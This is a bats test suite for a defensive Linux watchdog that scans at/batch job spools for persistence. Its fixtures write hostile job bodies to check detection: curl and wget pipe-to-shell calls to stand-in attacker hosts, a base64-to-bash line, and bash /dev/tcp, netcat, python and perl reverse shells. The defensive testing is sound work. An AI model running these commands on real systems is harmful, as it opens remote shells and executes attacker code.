#!/usr/bin/env bats
# L2 bats functional tests for the at-jobs-watchdog scan script.
#
# Covers the at/batch scheduler-persistence surface (the sibling of cron
# that cron-job-watchdog does not see): atd runs each spooled job AS ITS
# OWNER at the scheduled time. High-signal cases are a job body that
# re-submits itself (`at`/`batch` inside the job — a self-perpetuating
# loop) or one carrying a reverse shell / fetch-pipe-shell / tmp payload.
#
# Notably this LOCKS the module-specific pattern that SDD-061 D-6 preserved
# verbatim as a PATTERNS+=(...) extra — the at/batch self-resubmission
# pattern `(^|[;&|`$(][[:space:]]*)(at|batch)[[:space:]]` — proving the
# preserved-extra still detects after the migration onto module-lib.
#
# Runs the actual scan script with `logger` shadowed on PATH and the spool
# + baseline in a tmp sandbox via SELFDEF_ATJOBS_*; locks the
# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-at-jobs-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd/at-jobs-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SPOOL="${TMP}/spool"; mkdir -p "${SPOOL}"
    JOB="${SPOOL}/a00001"
    NOACL="${TMP}/nonexistent-acl"
}

teardown() { rm -rf "${TMP}"; }

# SPOOLS/ACLS use :- defaults, so override with non-empty values: a real
# spool dir and a nonexistent ACL path (so no ACL is picked up).
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ATJOBS_PROFILE="${PROFILE:-report}" \
    SELFDEF_ATJOBS_BASELINE="${BASELINE}" \
    SELFDEF_ATJOBS_SPOOLS="${SPOOLS:-$SPOOL}" \
    SELFDEF_ATJOBS_ACLS="${NOACL}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no at spool present → ok / no_at_spool" {
    SPOOLS="${TMP}/nospool" run_wd
    cap | grep -q '"event":"no_at_spool"'
    cap | grep -q '"severity":"ok"'
}

@test "benign job, first run → ok / baseline_initial" {
    printf '#!/bin/sh\nexport HOME=/root\n/usr/bin/backup.sh --nightly\n' > "${JOB}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged spool on second run → ok / at_jobs_intact" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"at_jobs_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED at/batch self-resubmit extra
# ============================================================

@test "job that re-submits itself via at → alert (preserved extra pattern)" {
    printf '#!/bin/sh\n/usr/bin/work.sh\nat now + 1 hour < /root/.relaunch\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job that re-arms via batch → alert (preserved extra pattern)" {
    printf '#!/bin/sh\nbatch <<EOF\n/usr/bin/work.sh\nEOF\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job body with a curl|sh payload → alert (canonical pattern)" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "job body with a /dev/tcp reverse shell → alert (canonical pattern)" {
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign job added after baseline → warn / at_jobs_changed" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    printf '#!/bin/sh\n/usr/bin/report.sh\n' > "${SPOOL}/a00002"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"at_jobs_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "benign job with only absolute commands is NOT flagged" {
    printf '#!/bin/sh\n/usr/bin/rsync -a /data /backup\n/usr/bin/logger done\n' > "${JOB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out self-resubmit line is NOT flagged" {
    printf '#!/bin/sh\n# at now + 1 day < /root/x\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — at-jobs inventory enumerates owner-scheduled exec surface)" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (preserved at-resubmit extra — at after semicolon): self-resubmit via ;at" {
    # The preserved pattern matches at/batch after multiple separators
    # (; & | \` $( ). Lock that semicolon-prefix form fires.
    printf '#!/bin/sh\n/usr/bin/work.sh; at now + 1 hour < /root/.relaunch\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (preserved at-resubmit extra — at after pipe): self-resubmit via |at" {
    printf '#!/bin/sh\necho work | at now + 1 hour\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in job)" {
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in job)" {
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (payload under /tmp): writable-root in command position" {
    printf '#!/bin/sh\n/tmp/.payload --run\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (payload under /var/tmp): writable-root expansion" {
    printf '#!/bin/sh\n/var/tmp/.payload --run\n' > "${JOB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current-behavior lock — at-jobs-watchdog scans job CONTENT, not the at-job file's own perms; file-mode is owned by world-writable-watchdog)" {
    # Architectural boundary: at-jobs-watchdog is content-scoped (CONTENT
    # of the at job is the persistence signal). File-mode coverage lives
    # in world-writable-watchdog by design.
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    chmod 0666 "${JOB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    # The at-job content is unchanged → no exec-signal content match
    # from THIS watchdog. world-writable-watchdog would surface the
    # file-mode change separately.
    ! cap | grep -q '"event":"at_jobs_alert_signature"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-at-jobs -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: at-jobs-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates)" {
    # T1053 at-scheduler persistence primitive — alert MUST persist
    # across runs until operator explicitly re-baselines. Sister to
    # cron-job-watchdog + many other watchdogs' no-auto-trust
    # INVARIANT.
    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
    run_wd
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${SPOOL}/a99999"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in at job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
    # acpi-hooks nc reverse-shell variant INVARIANTs across the
    # brain. Lock the netcat axis on the at-scheduler one-shot root-
    # exec persistence surface (T1053.001 — at jobs run AS THE
    # SUBMITTING USER at the scheduled time; if submitter is root or
    # the scheduled time arrives during a root-context window, exec
    # is root).
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on at job surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the at-scheduler
    # one-shot root-exec persistence surface (T1053.001 — at
    # jobs run AS THE SUBMITTING USER at the scheduled time).
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (payload under /dev/shm — tmpfs writable-root expansion axis on at job surface)" {
    # Sister to /tmp + /var/tmp writable-root INVARIANTs already
    # locked. /dev/shm is a tmpfs writable by ALL users, lives in
    # RAM (no disk persistence — wiped on reboot), and is rarely
    # surveilled by ops tooling. Attackers prefer /dev/shm for
    # high-velocity persistence drops + fast cleanup. The at-job
    # scanner MUST recognize /dev/shm payload paths just as
    # firmly as /tmp + /var/tmp — locks tmpfs-writable-root axis
    # symmetry on the T1053.001 (at-scheduled-task) surface.
    printf '#!/bin/sh\n/dev/shm/.payload\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (payload under /home — user-writable persistence vector on at job surface)" {
    # Sister to /tmp + /var/tmp + /dev/shm at-job writable-root
    # INVARIANTs. /home is user-writable; attacker pivots into
    # user account, plants /home/<user>/.payload, sets at job
    # pointing at it for delayed root-exec. T1053.001.
    printf '#!/bin/sh\n/home/alice/.payload\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on at job surface)" {
    # Sister to nc / python -c at job rev-shell INVARIANTs.
    # Perl on every Debian/Ubuntu. Locks perl axis on T1053.001
    # at-scheduled-task root-exec persistence — at jobs run AS
    # ROOT when scheduled by root, or AS user when scheduled by
    # them; planted perl rev-shell fires at the scheduled time.
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${JOB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on at-jobs surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The at-jobs-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1053.001 at-scheduled-task root-exec
    # persistence alert. Locks parser contract on the at-job
    # content-payload detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho hello\n' > "${JOB}"
    run_wd                                              # ok path
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${JOB}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: at-jobs-watchdog NEVER deletes at-job files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # at-jobs-watchdog DETECTS T1053.001 at-scheduled-task
    # root-exec persistence but MUST NEVER emit rm/atrm
    # commands to auto-clean the planted at job. The detected
    # job may be operator-legitimate (delayed maintenance task,
    # at-scheduled backup, one-shot reboot). Silent auto-delete
    # would destroy operator baseline state. Auto-atrm is also
    # a denial-of-service primitive. Surveillance, never
    # remediation. Locks anti-data-loss contract on the at-jobs
    # surveillance substrate.
    printf '#!/bin/sh\n/tmp/.evil\n' > "${JOB}"
    run_wd
    [ -f "${JOB}" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*(atrm|find[[:space:]].*-delete)'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(JOB|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # at-jobs-watchdog runs ON the timer's scheduled fire —
    # scans /var/spool/at + /var/spool/cron/atjobs for injection
    # patterns, emits a verdict, then exits. Type=simple would
    # break timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the at-jobs-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd/selfdef-at-jobs.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: at-jobs-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. at-jobs-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the at-jobs-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (at-jobs-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The at-jobs-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the at-jobs-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the at-jobs-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The at-jobs-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the at-jobs-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the at-jobs-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # at-jobs-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the at-jobs-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (at-jobs-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The at-jobs-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the at-jobs-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the at-jobs-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}
